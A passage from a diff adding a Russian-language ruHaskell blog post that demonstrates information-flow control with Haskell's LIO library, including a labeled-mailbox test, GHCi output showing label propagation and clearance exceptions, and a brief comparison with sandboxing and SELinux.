+<li><span class="math inline">\(1\)</span> – тег для информации, доступной неограниченному количеству участников.</li>
+</ul>
+<p>С помощью этой решетки, мы можем ограничить процессу возможность получения данных от
+разных процессов:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>test i s <span class="ot">=</span> <span class="kw">do</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>    a1 <span class="ot">&lt;-</span> evalLIO (newLIORef (<span class="dt">A</span> <span class="dv">1</span>) <span class="st">&quot;M1&quot;</span>) (<span class="dt">LIOState</span> (<span class="dt">A</span> <span class="dv">1</span>) <span class="dt">O</span>)</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>    a2 <span class="ot">&lt;-</span> evalLIO (newLIORef (<span class="dt">A</span> <span class="dv">2</span>) <span class="st">&quot;M2&quot;</span>) (<span class="dt">LIOState</span> (<span class="dt">A</span> <span class="dv">2</span>) <span class="dt">O</span>)</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    a3 <span class="ot">&lt;-</span> evalLIO (newLIORef (<span class="dt">A</span> <span class="dv">3</span>) <span class="st">&quot;M3&quot;</span>) (<span class="dt">LIOState</span> (<span class="dt">A</span> <span class="dv">3</span>) <span class="dt">O</span>)</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> state <span class="ot">=</span> [(<span class="st">&quot;A&quot;</span>,a1),(<span class="st">&quot;B&quot;</span>,a2),(<span class="st">&quot;C&quot;</span>,a3)]</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>    runLIO (go (<span class="ot">i::</span><span class="dt">Int</span>) state) (<span class="dt">LIOState</span> (<span class="dt">A</span> <span class="dv">1</span>) s)</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>  <span class="kw">where</span> </span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>    go <span class="dv">0</span> x <span class="ot">=</span> mailboxRead x <span class="st">&quot;A&quot;</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>    go <span class="dv">1</span> x <span class="ot">=</span> mailboxRead x <span class="st">&quot;B&quot;</span> <span class="op">&gt;&gt;</span> go <span class="dv">0</span> x</span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>    go <span class="dv">2</span> x <span class="ot">=</span> mailboxRead x <span class="st">&quot;C&quot;</span> <span class="op">&gt;&gt;</span> go <span class="dv">1</span> x</span></code></pre></div>
+<pre><code> -- запускаем тест, без ограничения (максимальный уровень доверия)
+ *Main&gt; test 0 O
+ (Just &quot;M1&quot;,LIOState {lioLabel = A 1, lioClearance = O})\
+ -- программа получала доступ только к своей ячейке - метка не изменяется
+ *Main&gt; test 1 O
+ (Just &quot;M1&quot;,LIOState {lioLabel = B 1 2, lioClearance = O})
+ -- программа получала доступ к двум ячейкам - соотвественно, метка изменилась
+ *Main&gt; test 2 O
+ (Just &quot;M1&quot;,LIOState {lioLabel = O, lioClearance = O})
+ -- программа получала доступ к трем ячейчас - соотвественно, метка стала 1 (One)
+
+ -- Теперь запустим тесты с огрниченным уровнем доверия
+ *Main&gt; test 2 O
+ (Just &quot;M1&quot;,LIOState {lioLabel = O, lioClearance = O})
+ *Main&gt; test 0 (B 1 2)
+ (Just &quot;M1&quot;,LIOState {lioLabel = A 1, lioClearance = B 1 2})
+ *Main&gt; test 1 (B 1 2)
+ (Just &quot;M1&quot;,LIOState {lioLabel = B 1 2, lioClearance = B 1 2})
+ *Main&gt; test 2 (B 1 2)
+ (*** Exception: LabelError {lerrContext = [&quot;readLIORef&quot;], lerrFailure = &quot;taint&quot;, lerrCurLabel = A 1, lerrCurClearance = B 1 2, lerrPrivs = [], lerrLabels = [A 3]}
+ -- получили исключение в связи с попыткой превышения прав.
+ *Main&gt; test 1 (B 1 3)
+ (*** Exception: LabelError {lerrContext = [&quot;readLIORef&quot;], lerrFailure = &quot;taint&quot;, lerrCurLabel = A 1, lerrCurClearance = B 1 3, lerrPrivs = [], lerrLabels = [A 2]}</code></pre>
+<p>В дальнейших постах могут быть рассмотрены и более сложные возможности применения
+библиотеки, такие как:</p>
+<pre><code>* использование привилегий;
+* более сложные правила для тегов, использующиеся для описания сложных систем;
+* полный пример небольшого защищенного сервиса.</code></pre>
+<p>Если кому-нибудь интересно, то можно продолжить.</p>
+<h4 id="как-решаются-подобные-проблемы-в-других-системах">Как решаются подобные проблемы в других системах?</h4>
+<p>Как мы могли заметить, возможность создания такого фреймворка полагается на мощную
+систему типов, позволяющую контролировать эффекты, чистоту языка и специальные
+расширения компилятора.</p>
+<p>Подобного эффекта можно добиться в языках, которые дают возможность использовать песочницы
+и позволяют подключить библиотеки для АОП (аспектно ориентированного программирования).
+Но такой подход значительно усложняет архитектуру приложения.</p>
+<p>В операционных системах так же существуют специльные решения, направленные на
+решение той же проблемы, например selinux.</p>
+<p>В целом же, защищенная система должна включать защиты на всех уровнях, возможная
+контейнеризация, selinux, безопасность внутри программы. Только в этом случае
+решение может быть достигнуто. Но подобные библиотеки и возможности языка
+существенно повышают качество системы.</p>
+</div>
+<div class="social-buttons-separator">
+    
+</div>
+<div id="socialButtons">
+    <a href="https://twitter.com/share" class="twitter-share-button" data-lang="ru" data-size="large">Твитнуть</a> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+</div>
+<div class="social-buttons-separator">
+    
+</div>
+<div>
+    <div id="disqus_thread"></div>    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'ruhaskell'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    
+</div>
+
+            </div>
+        </div>
+        <footer class="footer">
+            <div class="container-fluid">
+                <div class="row">
+                    <div class="col-lg-4 col-md-4 col-sm-4 col-xs-4 left">
+                        © 2014-2022 ruHaskell
+                    </div>
+                    <div class="col-lg-4 col-md-4 col-sm-4 col-xs-4 center">
+                        <a href="http://jaspervdj.be/hakyll/" id="hakyll-link">
+                            <span>
+                                Мы
+                            </span>
+                            <i class="fa fa-heart heart-color" aria-hidden="true">
+                                
+                            </i>
+                            <span>
+                                Hakyll
+                            </span>
+                        </a>
+                    </div>
+                    <div class="col-lg-4 col-md-4 col-sm-4 col-xs-4 right">
+                        <a href="https://github.com/ruHaskell/ruhaskell/blob/master/LICENSE" id="mit-link">
+                            <i class="fa fa-balance-scale" aria-hidden="true">
+                                
+                            </i>
+                            <span>
+                                MIT
+                            </span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </body>
+</html>
